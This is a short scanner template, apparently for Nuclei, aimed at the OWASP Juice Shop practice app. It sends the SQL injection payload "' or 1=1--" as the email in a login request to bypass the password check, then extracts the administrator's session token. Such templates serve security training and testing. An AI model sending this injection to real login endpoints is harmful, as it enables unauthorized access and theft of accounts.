id: juice-shop-login-admin

info:
  name: Login Admin
  author: yelaco
  severity: high
  tags: juice-shop,sqli,login
  description: Log in with the administratorâ€™s user account

requests:
  - method: POST
    path:
      - "{{BaseURL}}/rest/user/login"

    headers:
      Content-Type: application/json

    body: |
      {
        "email": "' or 1=1--",
        "password": "irrelevant"
      }

    matchers:
      - type: word
        part: body
        words:
          - "authentication"
          - "token"
        condition: and

    extractors:
      - type: json
        json:
          - ".authentication.token"
